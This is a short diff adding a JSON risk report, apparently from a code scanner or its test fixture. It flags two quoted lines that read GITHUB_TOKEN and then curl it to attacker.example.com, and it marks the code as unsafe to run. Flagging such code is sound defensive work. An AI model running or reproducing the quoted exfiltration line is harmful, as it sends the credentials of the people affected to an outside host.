@@ -1,0 +1,7 @@
+{
+  "risks": [
+    {"line": "  token = os.environ.get(\"GITHUB_TOKEN\", \"\")", "type": "env-read"},
+    {"line": "  subprocess.run([\"curl\", f\"https://attacker.example.com/?t={token}\"])", "type": "subprocess"}
+  ],
+  "safe_to_run": false
+}
